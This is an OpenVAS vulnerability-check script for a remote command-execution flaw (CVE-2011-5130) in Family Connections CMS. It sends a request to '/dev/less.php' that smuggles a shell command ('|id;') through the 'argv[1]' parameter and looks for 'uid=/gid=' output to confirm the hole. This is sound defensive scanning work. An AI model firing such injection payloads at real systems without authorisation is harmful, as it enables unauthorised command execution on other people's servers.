###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_fcms_50897.nasl 11829 2018-10-11 02:52:58Z ckuersteiner $
#
# Family Connections 'argv[1]' Parameter Remote Arbitrary Command Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103356");
  script_bugtraq_id(50897);
  script_cve_id("CVE-2011-5130");
  script_version("$Revision: 11829 $");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("Family Connections 'argv[1]' Parameter Remote Arbitrary Command Execution Vulnerability");
  script_tag(name:"last_modification", value:"$Date: 2018-10-11 04:52:58 +0200 (Thu, 11 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-12-06 10:40:05 +0100 (Tue, 06 Dec 2011)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("secpod_fcms_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("fcms/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50897");
  script_xref(name:"URL", value:"http://www.haudenschilt.com/fcms/index.html");
  script_xref(name:"URL", value:"http://sourceforge.net/apps/trac/fam-connections/ticket/407");

  script_tag(name:"solution", value:"Vendor updates are available. Please see the references for more
  information.");

  script_tag(name:"impact", value:"An attacker can exploit this issue to execute arbitrary commands
  within the context of the vulnerable application.");

  script_tag(name:"summary", value:"Family Connections is prone to a remote arbitrary command-
  execution vulnerability because it fails to properly validate user-supplied input.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

CPE = "cpe:/a:haudenschilt:family_connections_cms";

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE)) exit(0);
if(!dir = get_app_location(cpe:CPE, port:port)) exit(0);
if(dir == "/") dir = "";

# This will only work with the following php.ini requirements:
url = string(dir, "/dev/less.php?argv[1]=|id;");

if(http_vuln_check(port:port, url:url,pattern:"uid=[0-9]+.*gid=[0-9]+.*")) {
  report = report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);